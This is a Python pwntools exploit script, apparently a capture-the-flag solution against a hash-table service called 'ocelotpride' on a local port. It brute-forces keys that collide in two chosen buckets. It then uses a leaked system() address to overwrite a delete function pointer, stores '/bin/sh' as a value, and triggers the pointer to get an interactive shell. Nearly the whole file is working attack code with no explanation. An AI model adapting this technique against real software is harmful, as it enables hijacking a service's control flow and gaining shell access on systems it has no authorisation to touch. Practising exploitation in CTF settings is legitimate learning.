#!/usr/bin/env python3
from pwn import *
from string import ascii_lowercase
import itertools
import sys

def iter_strings():
    size = 1
    while True:
        for s in itertools.product(ascii_lowercase, repeat=size):
            yield "".join(s)
        size +=1

def hash_fn(string):
    hash = 5381;

    for c in string:
        hash *= 33
        hash += ord(c)

        hash %= 0xffffffffffffffff

    return hash % 0x63

idx_0_str = ""
idx_65_str = ""
for cur_str in iter_strings():
    idx = hash_fn(cur_str)
    if idx == 0:
        print("String for idx 0: {}".format(cur_str))
        idx_0_str = cur_str
    elif idx == 65:
        print("String for idx 65: {}".format(cur_str))
        idx_65_str = cur_str

    # found both indexes
    if idx_0_str and idx_65_str:
        break


#p = process("./ocelotpride")
p = remote("127.0.0.1", 30000)

system_addr = int(p.recvline().split(b":")[1][1:-1], base=16)
print(hex(system_addr))

shell_string = str(int.from_bytes(b"/bin/sh".ljust(8, b"\0"), byteorder="little"))
print(shell_string)

def set(key, payload):
    p.recvuntil(": ")
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(key)
    p.recvuntil(": ")
    p.sendline(payload)

def delete(key):
    p.recvuntil(": ")
    p.sendline("3")
    p.recvuntil(": ")
    p.sendline(key)


idx_0_str = "cc"
set(idx_0_str, shell_string) #make the first bucket entry look like "/bin/sh"

idx_65_str = "b" #to overwrite delete fptr
set(idx_65_str, str(system_addr)) # overwrite the delete fptr to system

delete("dwa") #trigger overridden fptr
p.interactive()




p.close()

